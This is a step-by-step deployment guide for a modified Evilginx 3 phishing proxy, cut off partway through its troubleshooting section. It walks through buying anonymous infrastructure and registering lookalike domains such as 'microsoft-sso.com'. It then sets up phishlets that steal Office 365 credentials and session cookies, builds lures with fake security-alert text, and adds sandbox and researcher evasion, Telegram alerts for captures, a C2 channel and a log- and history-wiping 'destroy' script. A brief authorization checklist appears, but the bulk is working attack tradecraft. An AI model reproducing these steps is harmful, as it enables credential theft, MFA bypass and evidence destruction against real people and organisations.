# Evilginx 3.3.1 Private Dev Edition - Complete Deployment Guide

## 📋 Table of Contents

1. [Prerequisites](#prerequisites)
2. [VPS Selection and Purchase](#vps-selection-and-purchase)
3. [Initial VPS Setup](#initial-vps-setup)
4. [Domain Registration and Configuration](#domain-registration-and-configuration)
5. [Cloudflare Setup and API Configuration](#cloudflare-setup-and-api-configuration)
6. [Evilginx Installation](#evilginx-installation)
7. [Advanced Features Configuration](#advanced-features-configuration)
8. [Phishlet Configuration](#phishlet-configuration)
9. [Lure Creation and Deployment](#lure-creation-and-deployment)
10. [Security Hardening](#security-hardening)
11. [Operational Best Practices](#operational-best-practices)
12. [Monitoring and Maintenance](#monitoring-and-maintenance)
13. [Troubleshooting](#troubleshooting)
14. [Cleanup and Evidence Removal](#cleanup-and-evidence-removal)

---

## Prerequisites

### Legal Requirements

⚠️ **CRITICAL: Before proceeding, ensure you have:**

- [ ] Written authorization from the target organization
- [ ] Clearly defined scope of engagement
- [ ] Legal review of local regulations
- [ ] Data handling and retention agreements
- [ ] Incident response plan
- [ ] Client contact information

### Technical Requirements

- [ ] Credit card or cryptocurrency for VPS purchase
- [ ] Email address (preferably privacy-focused)
- [ ] SSH client (PuTTY for Windows, built-in for Linux/macOS)
- [ ] Basic Linux command-line knowledge
- [ ] Domain name budget ($10-15/year)
- [ ] 2-4 hours for initial setup

### Recommended Skills

- Linux system administration
- Basic networking concepts (DNS, HTTPS, SSL/TLS)
- Understanding of web technologies
- Social engineering awareness

---

## VPS Selection and Purchase

### Recommended VPS Providers

#### Option 1: DigitalOcean (Recommended for Beginners)

**Pros:**
- Simple interface
- Excellent documentation
- Reliable infrastructure
- Snapshots and backups
- $100-200 free credit with referral

**Pricing:** $6-12/month

**Steps to Purchase:**

1. **Create Account**
   - Go to https://www.digitalocean.com
   - Sign up with email
   - Enable 2FA for security

2. **Add Payment Method**
   - Add credit card or PayPal
   - Verify account

3. **Create Droplet**
   - Click "Create" → "Droplets"
   - Choose Ubuntu 22.04 LTS
   - Select plan: Basic ($6/month minimum)
   - Choose datacenter region (close to target geography)
   - Authentication: SSH keys (recommended) or password
   - Click "Create Droplet"

4. **Note Your Credentials**
   - IP address: `xxx.xxx.xxx.xxx`
   - Root password (if not using SSH keys)
   - Save this information securely

#### Option 2: Vultr

**Pros:**
- More datacenter locations
- Hourly billing
- DDoS protection
- Anonymous payment options

**Pricing:** $5-10/month

**Steps:**
1. Go to https://www.vultr.com
2. Create account and verify
3. Deploy new instance:
   - Choose Cloud Compute
   - Select location
   - Choose Ubuntu 22.04 x64
   - Select $6/month plan or higher
   - Deploy instance

#### Option 3: Linode

**Pros:**
- High performance
- Good documentation
- Professional features
- Competitive pricing

**Pricing:** $5-10/month

#### Option 4: AWS Lightsail

**Pros:**
- AWS infrastructure
- Predictable pricing
- Good for enterprise engagements

**Pricing:** $5-10/month

**⚠️ Avoid for high-risk operations:**
- Google Cloud Platform (heavy monitoring)
- Microsoft Azure (compliance scanning)
- Shared hosting providers

### VPS Specifications (Minimum)

```
CPU:      1 vCPU
RAM:      1 GB (2 GB recommended)
Storage:  25 GB SSD
Bandwidth: 1 TB/month
OS:       Ubuntu 22.04 LTS or Debian 11
```

### Best Practices for VPS Selection

1. **Location Selection**
   - Choose datacenter close to target geography
   - Reduces latency and suspicion
   - Consider legal jurisdiction

2. **Payment Method**
   - Use privacy-focused payment if allowed
   - Bitcoin/cryptocurrency for anonymity
   - Virtual credit cards

3. **Account Security**
   - Unique email for VPS account
   - Strong, unique password
   - Enable 2FA
   - Use password manager

4. **Multiple VPS Strategy**
   - One VPS per campaign (recommended)
   - Separate C2 infrastructure
   - Disposable infrastructure approach

---

## Initial VPS Setup

### Step 1: Connect to Your VPS

**On Linux/macOS:**
```bash
ssh root@your.vps.ip.address
```

**On Windows (using PuTTY):**
1. Download PuTTY from https://www.putty.org
2. Enter your VPS IP address
3. Port: 22
4. Click "Open"
5. Login as `root`

### Step 2: System Update

```bash
# Update package lists
apt update

# Upgrade all packages
apt upgrade -y

# Install essential tools
apt install -y curl wget git vim ufw fail2ban htop net-tools
```

### Step 3: Create Non-Root User (Security Best Practice)

```bash
# Create new user
adduser evilginx

# Add to sudo group
usermod -aG sudo evilginx

# Switch to new user
su - evilginx
```

### Step 4: Configure Firewall

```bash
# Enable firewall
sudo ufw enable

# Allow SSH (IMPORTANT: Don't lock yourself out!)
sudo ufw allow 22/tcp

# Allow HTTP
sudo ufw allow 80/tcp

# Allow HTTPS
sudo ufw allow 443/tcp

# Allow DNS
sudo ufw allow 53/tcp
sudo ufw allow 53/udp

# Check status
sudo ufw status
```

### Step 5: Secure SSH Access

```bash
# Edit SSH config
sudo vim /etc/ssh/sshd_config
```

**Recommended settings:**
```
# Disable root login
PermitRootLogin no

# Disable password authentication (if using SSH keys)
PasswordAuthentication no

# Change default port (optional, helps avoid automated attacks)
Port 2222

# Only allow specific user
AllowUsers evilginx
```

**Restart SSH:**
```bash
sudo systemctl restart sshd
```

**⚠️ Important:** Test new SSH connection before closing current session!

### Step 6: Install Fail2Ban (Brute Force Protection)

```bash
# Install fail2ban
sudo apt install -y fail2ban

# Create local configuration
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

# Edit configuration
sudo vim /etc/fail2ban/jail.local
```

**Configure:**
```ini
[sshd]
enabled = true
port = 22
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
```

**Start service:**
```bash
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
```

### Step 7: Configure Time Synchronization

```bash
# Install NTP
sudo apt install -y ntp

# Enable and start
sudo systemctl enable ntp
sudo systemctl start ntp

# Verify
timedatectl
```

---

## Domain Registration and Configuration

### Step 1: Choose a Domain Name

**Best Practices:**

1. **Legitimacy**
   - Use realistic, professional names
   - Avoid obvious phishing indicators
   - Consider typosquatting variations
   - Age domains before use (if possible)

2. **Examples:**
   - Good: `microsoft-sso.com`, `secure-login-office.com`
   - Bad: `phishing123.com`, `fake-microsoft.com`

3. **TLD Selection**
   - `.com` - Most trusted
   - `.net` - Professional
   - `.org` - Legitimate appearance
   - Avoid: `.xyz`, `.tk`, `.ml` (known for abuse)

### Step 2: Register Domain

**Recommended Registrars:**

1. **Namecheap** (https://www.namecheap.com)
   - Affordable
   - Free WHOIS privacy
   - Good for testing

2. **Porkbun** (https://porkbun.com)
   - Low prices
   - Free privacy
   - Simple interface

3. **CloudFlare Registrar** (https://www.cloudflare.com/products/registrar/)
   - At-cost pricing
   - Privacy included
   - Direct integration

**Registration Steps:**

1. Search for available domain
2. Add to cart
3. **Enable WHOIS Privacy Protection** (critical!)
4. Complete purchase
5. Verify registration email

**Cost:** $8-15/year

### Step 3: Point Domain to Cloudflare

After registration, you'll configure DNS through Cloudflare in the next section.

---

## Cloudflare Setup and API Configuration

### Why Cloudflare?

**Benefits:**
- Free SSL/TLS certificates
- DDoS protection
- CDN (Content Delivery Network)
- DNS management
- IP address masking
- Rate limiting
- Analytics

### Step 1: Create Cloudflare Account

1. Go to https://www.cloudflare.com
2. Sign up with email
3. Verify email address
4. Enable 2FA (Settings → Security)

### Step 2: Add Your Domain to Cloudflare

1. **Add Site**
   - Click "Add a Site"
   - Enter your domain name
   - Click "Add Site"

2. **Select Plan**
   - Choose "Free" plan
   - Click "Continue"

3. **Review DNS Records**
   - Cloudflare will scan existing DNS records
   - Click "Continue"

4. **Update Nameservers**
   - Cloudflare will provide nameservers (e.g., `ns1.cloudflare.com`)
   - Go to your domain registrar
   - Update nameservers to Cloudflare's
   - This may take up to 24-48 hours to propagate

5. **Verify Nameserver Change**
   ```bash
   # Check nameservers
   dig NS yourdomain.com +short
   
   # Should return Cloudflare nameservers
   ```

### Step 3: Configure Cloudflare DNS

1. **Go to DNS Settings**
   - Click on your domain
   - Navigate to "DNS" tab

2. **Add A Record for Your VPS**
   - Type: `A`
   - Name: `@` (root domain)
   - IPv4 address: `your.vps.ip`
   - Proxy status: **DNS only** (grey cloud)
   - TTL: Auto
   - Click "Save"

3. **Add A Record for Phishing Subdomain**
   - Type: `A`
   - Name: `login` (or your chosen subdomain)
   - IPv4 address: `your.vps.ip`
   - Proxy status: **DNS only** (grey cloud initially)
   - Click "Save"

4. **Add Wildcard Record (Optional)**
   - Type: `A`
   - Name: `*`
   - IPv4 address: `your.vps.ip`
   - Proxy status: **DNS only**
   - Click "Save"

**⚠️ Important:** Start with **DNS only** (grey cloud). Enable proxy (orange cloud) after testing.

### Step 4: Configure SSL/TLS Settings

1. **Go to SSL/TLS Settings**
   - Click "SSL/TLS" tab
   - Select "Full" encryption mode
   - **NOT** "Full (strict)" initially

2. **Configure SSL/TLS Options**
   - Enable "Always Use HTTPS"
   - Enable "Automatic HTTPS Rewrites"
   - Minimum TLS Version: TLS 1.2
   - Enable TLS 1.3

### Step 5: Create Cloudflare API Token

This is required for automated DNS management and certificate generation.

1. **Navigate to API Tokens**
   - Click profile icon (top right)
   - Select "My Profile"
   - Click "API Tokens" tab
   - Click "Create Token"

2. **Create Custom Token**
   - Click "Create Custom Token"
   - Token name: `Evilginx DNS Management`
   
3. **Configure Permissions**
   ```
   Permissions:
   - Zone → DNS → Edit
   - Zone → Zone → Read
   
   Zone Resources:
   - Include → Specific zone → yourdomain.com
   ```

4. **Set Additional Settings**
   - Client IP Address Filtering: Add your VPS IP (optional)
   - TTL: Start Date (today), No End Date

5. **Create and Copy Token**
   - Click "Continue to summary"
   - Click "Create Token"
   - **COPY AND SAVE THE TOKEN SECURELY**
   - You won't be able to see it again!

**Example Token:**
```
aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890
```

### Step 6: Get Cloudflare Account Details

You'll need these for Evilginx configuration:

1. **Zone ID**
   - Go to your domain overview in Cloudflare
   - Scroll down to "API" section
   - Copy "Zone ID"

2. **Account Email**
   - Your Cloudflare account email

3. **API Token**
   - The token you just created

**Save these securely:**
```
Cloudflare Email: your@email.com
API Token: aBcDeFgHiJkLmNoPqRsTuVwXyZ1234567890
Zone ID: 1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p
Domain: yourdomain.com
```

### Step 7: Additional Cloudflare Security Settings

1. **Firewall Rules (Optional)**
   - Go to "Security" → "WAF"
   - Create rules to block specific countries
   - Block known security researchers

2. **Rate Limiting**
   - Go to "Security" → "Rate Limiting"
   - Create rule: 100 requests per 10 seconds per IP

3. **Enable Bot Fight Mode**
   - Go to "Security" → "Bots"
   - Enable "Bot Fight Mode" (free)

4. **Page Rules (Optional)**
   - Go to "Rules" → "Page Rules"
   - Create rule to cache static content
   - Disable for login pages

---

## Evilginx Installation

### 🎯 Recommended: Automated One-Click Installation

**The easiest way to install Evilginx with complete system configuration:**

```bash
# Clone repository
git clone https://github.com/yourusername/evilginx3.git
cd evilginx3

# Run automated installer
chmod +x install.sh
sudo ./install.sh
```

**The installer automatically:**
- ✅ Installs all dependencies (Go 1.22, tools, libraries)
- ✅ Builds Evilginx from source
- ✅ Stops conflicting services (Apache2, Nginx, BIND9)
- ✅ Configures firewall rules (ports 22, 53, 80, 443)
- ✅ Creates systemd service with auto-start
- ✅ Sets up fail2ban SSH protection
- ✅ Implements security hardening
- ✅ Creates helper commands (evilginx-start, evilginx-stop, etc.)

**Post-installation commands:**
```bash
evilginx-console    # Configure interactively
evilginx-start      # Start as system service
evilginx-status     # Check status
evilginx-logs       # Monitor logs
```

**📚 Complete installer documentation:** [INSTALLATION_QUICK_START.md](INSTALLATION_QUICK_START.md)

---

### Alternative: Manual Installation

If you prefer manual control or the automated installer doesn't work:

#### Step 1: Install Go Programming Language

```bash
# Download Go
cd /tmp
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz

# Extract
sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz

# Add to PATH
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc

# Verify installation
go version
# Output: go version go1.22.0 linux/amd64
```

#### Step 2: Clone Evilginx Repository

```bash
# Create working directory
mkdir -p ~/phishing
cd ~/phishing

# Clone repository (replace with your repo URL)
git clone https://github.com/yourusername/evilginx3.git
cd evilginx3
```

#### Step 3: Build Evilginx

```bash
# Download dependencies
go mod download

# Build binary
make

# OR build manually
go build -o build/evilginx main.go

# Make executable
chmod +x build/evilginx

# Verify build
./build/evilginx -v
```

### Step 4: Initial Configuration Directory

```bash
# Evilginx creates config in ~/.evilginx by default
# You can specify custom path with -c flag

# Create custom config directory (optional)
mkdir -p ~/evilginx-config
```

### Step 5: First Run (Test)

```bash
# Run Evilginx (as root for ports 80/443)
sudo ./build/evilginx -p ./phishlets

# You should see the banner and terminal
# Type 'help' to see available commands
```

### Step 6: Configure DNS Provider (Cloudflare)

In the Evilginx terminal:

```bash
# Configure Cloudflare DNS provider
config dns_provider cloudflare
config dns_api_key YOUR_CLOUDFLARE_API_TOKEN
config dns_email YOUR_CLOUDFLARE_EMAIL
config dns_enabled true
```

### Step 7: Configure Basic Settings

```bash
# Set your domain
config domain yourdomain.com

# Set VPS IP address
config ipv4 external your.vps.ip.address
config ipv4 bind 0.0.0.0

# Enable automatic certificate retrieval
config autocert on

# Set redirect URL (where victims go after phishing)
config redirect_url https://office.com

# Verify configuration
config
```

### Step 8: Test DNS Resolution

```bash
# Exit Evilginx (Ctrl+C or type 'exit')

# Test DNS from another machine
dig @8.8.8.8 yourdomain.com
dig @8.8.8.8 login.yourdomain.com

# Should return your VPS IP
```

---

## Advanced Features Configuration

### Step 1: Enable Machine Learning Bot Detection

```bash
# Start Evilginx
sudo ./build/evilginx -p ./phishlets
```

In Evilginx terminal:

```bash
# Enable ML detection
config ml_detection on

# Set detection threshold (0.0-1.0, higher = stricter)
config ml_threshold 0.75

# Enable learning mode (adapts to traffic patterns)
config ml_learning on

# Set cache duration (minutes)
config ml_cache_duration 30

# Verify
config ml_detection
```

### Step 2: Enable JA3 Fingerprinting

```bash
# Enable JA3 fingerprinting
config ja3_detection on

# Block known bot signatures
config ja3_block_bots on

# Add custom JA3 hash to whitelist (if needed)
ja3 whitelist add YOUR_JA3_HASH

# Verify
config ja3_detection
```

### Step 3: Configure Sandbox Detection

```bash
# Enable sandbox detection
config sandbox_detection on

# Set detection mode: passive, active, or aggressive
config sandbox_mode active

# Set action on detection: block, redirect, or honeypot
config sandbox_action redirect

# Set redirect URL for sandboxes
config sandbox_redirect https://example.com

# Enable server-side checks
config sandbox_server_checks on

# Enable client-side JavaScript checks
config sandbox_client_checks on

# Verify
config sandbox_detection
```

### Step 4: Enable Polymorphic JavaScript Engine

```bash
# Enable polymorphic engine
config polymorphic on

# Set mutation level: low, medium, high, extreme
config mutation_level high

# Enable caching (performance)
config polymorphic_cache on

# Set cache duration (minutes)
config polymorphic_cache_duration 15

# Set seed rotation interval (minutes)
config seed_rotation 30

# Enable semantic preservation
config preserve_semantics on

# Verify
config polymorphic
```

### Step 5: Configure Traffic Shaping

```bash
# Enable traffic shaping
config traffic_shaping on

# Set global rate limit (requests per minute)
config global_rate_limit 1000

# Set per-IP rate limit (requests per minute)
config per_ip_rate_limit 60

# Set per-IP burst size
config burst_size 100

# Enable DDoS protection
config ddos_protection on

# Set adaptive mode
config traffic_mode adaptive

# Verify
config traffic_shaping
```

### Step 6: Configure Domain Rotation (Optional)

```bash
# Enable domain rotation
config domain_rotation on

# Set rotation strategy: round-robin, weighted, health-based, random
config rotation_strategy health-based

# Set rotation interval (minutes)
config rotation_interval 60

# Add backup domains
domains add backup1.yourdomain.com
domains add backup2.yourdomain.com

# Enable health checking
domains health_check on

# Verify
domains list
```

### Step 7: Setup Telegram Notifications

**First, create a Telegram bot:**

1. Open Telegram and search for `@BotFather`
2. Send `/newbot`
3. Follow prompts to create bot
4. Copy the API token

**Get your Chat ID:**

1. Search for `@userinfobot` in Telegram
2. Start conversation
3. It will send your chat ID

**Configure in Evilginx:**

```bash
# Set Telegram bot token
config telegram_token YOUR_BOT_TOKEN

# Set chat ID
config telegram_chat YOUR_CHAT_ID

# Enable Telegram notifications
config telegram on

# Test notification
telegram test

# Verify
config telegram
```

### Step 8: Configure C2 Channel (Advanced)

```bash
# Enable C2 channel
config c2_enabled on

# Set transport: https or dns
config c2_transport https

# Set C2 server URL
config c2_url https://c2.yourdomain.com

# Set encryption key (generate strong key)
config c2_encryption_key $(openssl rand -hex 32)

# Enable compression
config c2_compression on

# Verify
config c2_enabled
```

### Step 9: Configure Cloudflare Worker (Optional)

This provides additional IP protection and DDoS mitigation.

```bash
# Enable Cloudflare Worker integration
config cloudflare_worker on

# Set worker URL
config worker_url https://worker.yourdomain.com

# Set API token
config cloudflare_api_token YOUR_API_TOKEN

# Verify
config cloudflare_worker
```

### Step 10: Verify All Advanced Features

```bash
# Display all configuration
config

# Should show all enabled features:
# ✓ ML Detection: ON
# ✓ JA3 Fingerprinting: ON
# ✓ Sandbox Detection: ON
# ✓ Polymorphic Engine: ON
# ✓ Traffic Shaping: ON
# ✓ Telegram: ON
```

---

## Phishlet Configuration

### Step 1: Understand Phishlet Structure

A phishlet is a YAML configuration file that tells Evilginx:
- Which domains to proxy
- What credentials to capture
- Which cookies to steal
- How to filter/replace content

### Step 2: List Available Phishlets

```bash
# In Evilginx terminal
phishlets

# Output shows:
# - Phishlet name
# - Enabled status
# - Hostname
```

### Step 3: Examine a Phishlet

```bash
# View phishlet details
phishlets get-hosts o365

# Show full configuration
cat phishlets/o365.yaml
```

### Step 4: Configure Phishlet Hostname

```bash
# Set hostname for phishlet
phishlets hostname o365 login.yourdomain.com

# For phishlets with multiple subdomains, set each:
phishlets hostname o365 login.yourdomain.com
phishlets hostname o365 outlook.yourdomain.com
```

### Step 5: Enable Phishlet

```bash
# Enable the phishlet
phishlets enable o365

# Verify
phishlets

# Should show:
# o365 [ENABLED] login.yourdomain.com
```

### Step 6: Test Phishlet (Important!)

```bash
# Get the phishing URL (we'll create lure in next section)
# For now, test basic connectivity

# From another machine:
curl -I https://login.yourdomain.com

# Should return HTTP 200 and SSL certificate
```

### Step 7: Customize Phishlet (Optional)

Create custom phishlet for a different target:

```bash
# Copy example phishlet
cp phishlets/example.yaml phishlets/custom.yaml

# Edit the file
vim phishlets/custom.yaml
```

**Basic phishlet structure:**

```yaml
min_ver: '3.0.0'
author: 'your_name'
redirect_url: 'https://legitimate-site.com'

proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'targetsite.com'
    session: true
    is_landing: true
    auto_filter: true

sub_filters:
  - triggers_on: 'login.targetsite.com'
    orig_sub: 'login'
    domain: 'targetsite.com'
    search: 'https://login\.targetsite\.com'
    replace: 'https://{phish_sub_subdomain}.{domain}'
    mimes: ['text/html', 'application/json']

auth_tokens:
  - domain: '.targetsite.com'
    keys: ['session_cookie', 'auth_token']
    type: 'cookie'

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '/auth/login'
  - '/dashboard'

login:
  domain: 'login.targetsite.com'
  path: '/login'
```

### Step 8: Reload Phishlets

```bash
# After editing, reload
phishlets reload

# Or restart Evilginx
exit
sudo ./build/evilginx -p ./phishlets
```

---

## Lure Creation and Deployment

### Step 1: Understanding Lures

A lure is a unique phishing URL that:
- Tracks individual targets
- Contains encoded parameters
- Triggers session creation
- Can have custom redirects

### Step 2: Create Basic Lure

```bash
# Create lure for phishlet
lures create o365

# Output:
# [+] Created lure with ID: 0
```

### Step 3: Configure Lure Parameters

```bash
# Set redirect URL (where victim goes after successful phishing)
lures edit 0 redirect_url https://office.com

# Set custom path (optional)
lures edit 0 path /secure/login

# Set info for target (tracking)
lures edit 0 info "John Doe - IT Manager"

# Enable/disable lure
lures edit 0 paused false
```

### Step 4: Configure Open Graph Tags

These control how the link appears when shared on social media:

```bash
# Set Open Graph title
lures edit 0 og_title "Microsoft Security Alert"

# Set Open Graph description
lures edit 0 og_description "Your account requires immediate verification"

# Set Open Graph image
lures edit 0 og_image "https://yourdomain.com/images/microsoft-logo.png"

# Set Open Graph URL
lures edit 0 og_url "https://login.yourdomain.com"
```

### Step 5: Configure User-Agent Filtering (Optional)

Restrict access based on browser/device:

```bash
# Set User-Agent regex filter
lures edit 0 ua_filter "Mozilla.*Windows.*Chrome"

# This only allows Windows Chrome browsers
# Block mobile: "^((?!Mobile).)*$"
# Allow only mobile: "Mobile|Android|iPhone"
```

### Step 6: Get Phishing URL

```bash
# Get the lure URL
lures get-url 0

# Output:
# https://login.yourdomain.com/aBcDeF123

# Copy this URL - this is your phishing link!
```

### Step 7: Generate Multiple URLs with Parameters

```bash
# Create URLs with custom parameters
lures get-url 0 target=john.doe@company.com campaign=it_dept

# Output:
# https://login.yourdomain.com/XyZ789?p=encrypted_params

# Parameters are encrypted in the URL
```

### Step 8: Bulk URL Generation

Create a file `targets.txt`:
```
john.doe@company.com,IT Manager,Campaign A
jane.smith@company.com,HR Director,Campaign A
bob.jones@company.com,Finance Lead,Campaign B
```

Generate URLs:
```bash
# Import from CSV
lures get-url 0 import targets.txt export phishing_urls.txt csv

# This creates phishing_urls.txt with URLs for each target
```

### Step 9: Create Lure with HTML Redirector

```bash
# Create custom HTML redirector page
# This adds a layer before the actual phishing page

# First, create HTML file
cat > redirectors/custom/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            background: #0078d4;
            color: white;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #0078d4;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Microsoft Office 365</h2>
        <div class="spinner"></div>
        <p>Redirecting to secure login...</p>
    </div>
    <script>
        // Redirect after 2 seconds
        setTimeout(function() {
            window.location.href = "{lure_url_html}";
        }, 2000);
    </script>
</body>
</html>
EOF

# Assign redirector to lure
lures edit 0 redirector custom
```

### Step 10: View All Lures

```bash
# List all lures
lures

# Detailed view of specific lure
lures get 0
```

### Step 11: Pause/Unpause Lure

```bash
# Pause lure (stops accepting new sessions)
lures pause 0

# Unpause
lures unpause 0

# Pause for specific duration (in minutes)
lures pause 0 60
```

### Step 12: Delete Lure

```bash
# Delete when no longer needed
lures delete 0
```

---

## Security Hardening

### Step 1: VPS Security

```bash
# Disable IPv6 (if not needed)
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1
sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1

# Enable SYN cookies (DDoS protection)
sudo sysctl -w net.ipv4.tcp_syncookies=1

# Disable ICMP redirects
sudo sysctl -w net.ipv4.conf.all.accept_redirects=0

# Make changes permanent
sudo vim /etc/sysctl.conf
# Add the above settings
sudo sysctl -p
```

### Step 2: Limit SSH Access

```bash
# Install and configure UFW properly
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 53
sudo ufw enable

# Limit SSH connections
sudo ufw limit 22/tcp
```

### Step 3: Configure Automatic Updates

```bash
# Install unattended upgrades
sudo apt install -y unattended-upgrades

# Configure
sudo dpkg-reconfigure -plow unattended-upgrades
```

### Step 4: Disable Unnecessary Services

```bash
# List running services
systemctl list-units --type=service --state=running

# Disable unnecessary ones
sudo systemctl disable bluetooth
sudo systemctl disable cups
```

### Step 5: Setup Log Rotation

```bash
# Configure logrotate for Evilginx
sudo vim /etc/logrotate.d/evilginx
```

Add:
```
/home/evilginx/.evilginx/logs/*.log {
    daily
    rotate 7
    compress
    delaycompress
    missingok
    notifempty
}
```

### Step 6: Enable Process Isolation

```bash
# Run Evilginx in screen or tmux
sudo apt install -y screen

# Start screen session
screen -S evilginx

# Run Evilginx
sudo ./build/evilginx -p ./phishlets

# Detach: Ctrl+A, then D
# Reattach: screen -r evilginx
```

### Step 7: Secure Credentials Storage

```bash
# Encrypt captured credentials at rest
# Create encryption key
openssl rand -base64 32 > ~/.evilginx/encryption.key
chmod 600 ~/.evilginx/encryption.key

# In Evilginx config
config encrypt_database on
config encryption_key $(cat ~/.evilginx/encryption.key)
```

### Step 8: Setup Automatic Shutdown

Create automatic infrastructure destruction:

```bash
# Create shutdown script
vim ~/destroy.sh
```

Add:
```bash
#!/bin/bash
# Emergency shutdown and cleanup

# Stop Evilginx
pkill -f evilginx

# Clear logs
rm -rf ~/.evilginx/logs/*

# Remove captured data
rm -rf ~/.evilginx/data.db

# Clear bash history
history -c
cat /dev/null > ~/.bash_history

# Clear system logs
sudo journalctl --vacuum-time=1s

# Optionally, destroy VPS
# DigitalOcean: doctl compute droplet delete YOUR_DROPLET_ID
```

Make executable:
```bash
chmod +x ~/destroy.sh
```

---

## Operational Best Practices

### Pre-Engagement Checklist

- [ ] Written authorization received
- [ ] Scope clearly defined
- [ ] Legal review completed
- [ ] Incident response plan ready
- [ ] Client contact available
- [ ] Backup communication channel established
- [ ] Data retention policy agreed
- [ ] Infrastructure ready to destroy

### During Engagement

1. **Monitor Continuously**
   ```bash
   # Watch sessions in real-time
   sessions
   
   # Monitor in separate terminal
   watch -n 5 'sessions'
   ```

2. **Log Everything**
   ```bash
   # Enable detailed logging
   config log_level debug
   
   # Save terminal output
   script ~/engagement_log.txt
   ```

3. **Verify Captures**
   ```bash
   # Check captured sessions
   sessions
   
   # View session details
   sessions get SESSION_ID
   ```

4. **Stay Alert**
   - Monitor for security researchers
   - Watch for abnormal traffic
   - Check Telegram notifications
   - Review logs regularly

### Communication Security

1. **Use Encrypted Channels**
   - Signal for text communication
   - Encrypted email (PGP)
   - Secure file transfer (SFTP, encrypted containers)

2. **Avoid Clear Text**
   - Never send credentials via email
   - Use password-protected documents
   - Encrypt all exported data

3. **Secure Data Transfer**
   ```bash
   # Export sessions encrypted
   sessions export encrypted_sessions.json
   
   # Encrypt with GPG
   gpg -c encrypted_sessions.json
   
   # Transfer securely
   scp encrypted_sessions.json.gpg client@secure-host:~/
   ```

### Target Selection and Scope

1. **Stay Within Scope**
   - Only target approved individuals
   - Respect time boundaries
   - Stop at agreed limits

2. **Track Targets**
   ```bash
   # Use lure info field
   lures edit 0 info "Target: John Doe, Dept: IT, Phase: 1"
   ```

3. **Avoid Collateral Damage**
   - Use precise targeting
   - Implement IP whitelisting if possible
   - Monitor for unintended access

### Data Handling

1. **Minimize Collection**
   ```bash
   # Only capture necessary credentials
   # Configure phishlet to exclude unnecessary data
   ```

2. **Secure Storage**
   - Encrypt database
   - Use encrypted file systems
   - Secure key management

3. **Secure Destruction**
   ```bash
   # After engagement
   sessions flush
   
   # Securely delete database
   shred -vfz -n 10 ~/.evilginx/data.db
   
   # Clear logs
   shred -vfz -n 10 ~/.evilginx/logs/*
   ```

---

## Monitoring and Maintenance

### Real-Time Monitoring

#### Terminal-Based Monitoring

```bash
# Monitor sessions
watch -n 2 'echo "=== ACTIVE SESSIONS ===" && sessions'

# Monitor system resources
htop

# Monitor network connections
watch -n 5 'netstat -an | grep :443'

# Monitor logs
tail -f ~/.evilginx/logs/evilginx.log
```

#### Telegram Notifications

Ensure Telegram is configured for instant alerts:

```bash
# Test notification
telegram test

# Notifications will be sent for:
# - New session created
# - Credentials captured
# - Session cookies obtained
# - Suspicious activity detected
```

### Performance Monitoring

```bash
# Check CPU and memory usage
top

# Check disk usage
df -h

# Check network bandwidth
ifstat

# Monitor Evilginx process
ps aux | grep evilginx
```

### Session Management

```bash
# List all sessions
sessions

# View session details
sessions get SESSION_ID

# Delete old sessions
sessions delete SESSION_ID

# Flush all sessions
sessions flush

# Export sessions
sessions export sessions.json
```

### Log Analysis

```bash
# View logs
cat ~/.evilginx/logs/evilginx.log

# Search for specific events
grep "credentials" ~/.evilginx/logs/evilginx.log

# Count successful captures
grep -c "captured" ~/.evilginx/logs/evilginx.log

# Watch for errors
grep "ERROR" ~/.evilginx/logs/evilginx.log
```

### Health Checks

```bash
# Check if Evilginx is running
ps aux | grep evilginx

# Check listening ports
sudo netstat -tlnp | grep evilginx

# Test DNS resolution
dig @localhost yourdomain.com

# Test HTTPS
curl -I https://login.yourdomain.com

# Check certificate
echo | openssl s_client -connect login.yourdomain.com:443 | openssl x509 -noout -dates
```

### Backup Critical Data

```bash
# Backup configuration
cp -r ~/.evilginx ~/evilginx-backup-$(date +%Y%m%d)

# Backup sessions
sessions export ~/sessions-backup-$(date +%Y%m%d).json

# Create encrypted backup
tar -czf - ~/.evilginx | openssl enc -aes-256-cbc -e > ~/evilginx-backup.tar.gz.enc
```

### Update Management

```bash
# Pull latest changes
cd ~/phishing/evilginx3
git pull

# Rebuild
make clean
make

# Restart Evilginx
# (in screen session)
pkill evilginx
sudo ./build/evilginx -p ./phishlets
```

---

## Troubleshooting

### Issue: Port 443 Already in Use

**Symptoms:**
```
Error: bind: address already in use
```

**Solution:**
```bash
# Find what's using the port
sudo lsof -i :443

# Stop the conflicting service
sudo systemctl stop apache2
sudo systemctl stop nginx

# Disable from starting on boot
sudo systemctl disable apache2
sudo systemctl disable nginx
```

### Issue: DNS Not Resolving

**Symptoms:**
- Phishing site not accessible
- Certificate errors

**Solution:**
```bash
# Check nameservers
dig NS yourdomain.com +short

# Should return Cloudflare nameservers
# If not, nameserver change hasn't propagated yet (wait 24-48hrs)

# Test local DNS
dig @localhost yourdomain.com

# Check Evilginx DNS server
sudo netstat -ulnp | grep :53

# Restart Evilginx
```

### Issue: Certificate Not Generating

**Symptoms:**
```
Error: Failed to obtain certificate
```

**Solution:**
```bash
